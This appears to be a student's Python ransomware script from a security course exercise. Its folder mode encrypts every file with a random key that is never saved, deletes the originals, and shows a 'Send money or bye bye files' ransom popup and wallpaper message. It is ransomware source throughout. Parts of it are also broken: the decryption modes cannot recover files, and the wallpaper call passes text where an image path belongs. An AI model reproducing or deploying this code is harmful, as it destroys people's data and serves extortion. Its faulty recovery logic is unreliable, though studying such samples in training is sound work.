#!/bin/usr/python3

# Script Name:                      401 ops challenge 08
# Author:                           Ethan Pham
# Date of latest revision:          May 8, 2024
# Purpose:                          Add ransomware message and dektop alteration to the script

import os
import shutil
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import ctypes

def encrypt_file(input_file, output_file, key):
    with open(input_file, 'rb') as f:
        plaintext = f.read()

    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv))
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext) + encryptor.finalize()

    with open(output_file, 'wb') as f:
        f.write(iv)
        f.write(ciphertext)

def decrypt_file(input_file, output_file, key):
    with open(input_file, 'rb') as f:
        iv = f.read(16)
        ciphertext = f.read()

    cipher = Cipher(algorithms.AES(key), modes.CFB(iv))
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()

    with open(output_file, 'wb') as f:
        f.write(plaintext)

def encrypt_message(message, key):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv))
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(message.encode()) + encryptor.finalize()
    return iv + ciphertext

def decrypt_message(ciphertext, key):
    iv = ciphertext[:16]
    ciphertext = ciphertext[16:]
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv))
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()
    return plaintext.decode()

def encrypt_folder(folder_path, key):
    for root, dirs, files in os.walk(folder_path):
        for file_name in files:
            input_file = os.path.join(root, file_name)
            output_file = input_file + '.encrypted'
            encrypt_file(input_file, output_file, key)
            os.remove(input_file)

def decrypt_folder(folder_path, key):
    for root, dirs, files in os.walk(folder_path):
        for file_name in files:
            if file_name.endswith('.encrypted'):
                input_file = os.path.join(root, file_name)
                output_file = input_file[:-10]  # Remove the '.encrypted' suffix
                decrypt_file(input_file, output_file, key)
                os.remove(input_file)
def change_wallpaper(message):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, message, 0)

def show_popup(message):
    ctypes.windll.user32.MessageBoxW(0, message, "Popup Window", 1)

def main():
    print("Select mode:")
    print("1. Encrypt a file")
    print("2. Decrypt a file")
    print("3. Encrypt a message")
    print("4. Decrypt a message")
    print("5. Encrypt a folder")
    print("6. Decrypt a folder")
    print("7. Alter desktop wallpaper")
    print("8. Create popup window")

    mode = input("Enter mode (1/2/3/4/5/6/7/8): ")

    if mode in ('1', '2'):
        input_file = input("Enter input file name: ")
        key = os.urandom(32)  # Generate a random 256-bit AES key
        if mode == '1':
            output_file = input("Enter output file name: ")
            encrypt_file(input_file, output_file, key)
            print("File encrypted successfully.")
            os.remove(input_file)
        else:
            output_file = input("Enter output file name: ")
            decrypt_file(input_file, output_file, key)
            print("File decrypted successfully.")
            os.remove(input_file)

    elif mode in ('3', '4'):
        if mode == '3':
            message = input("Enter message to encrypt: ")
            key = os.urandom(32)  # Generate a random 256-bit AES key
            ciphertext = encrypt_message(message, key)
            print("Encrypted message:", ciphertext.hex())
        else:
            ciphertext = bytes.fromhex(input("Enter ciphertext (in hex): "))
            key = input("Enter AES key (32 bytes): ")
            plaintext = decrypt_message(ciphertext, key)
            print("Decrypted message:", plaintext)

    elif mode == '5':
        folder_path = input("Enter folder path to encrypt: ")
        key = os.urandom(32)  # Generate a random 256-bit AES key
        encrypt_folder(folder_path, key)
        print("Folder encrypted successfully.")

    elif mode == '6':
        folder_path = input("Enter folder path to decrypt: ")
        key = input("Enter AES key (32 bytes): ")
        decrypt_folder(folder_path, key)
        print("Folder decrypted successfully.")

    elif mode == '7':
        message = "Send money or bye bye files"
        change_wallpaper(message)
        print("Desktop wallpaper changed successfully.")

    elif mode == '8':
        message = "Send money or bye bye files"
        show_popup(message)
        print("Popup window shown successfully.")

    else:
        print("Invalid mode selected.")

if __name__ == "__main__":
    main()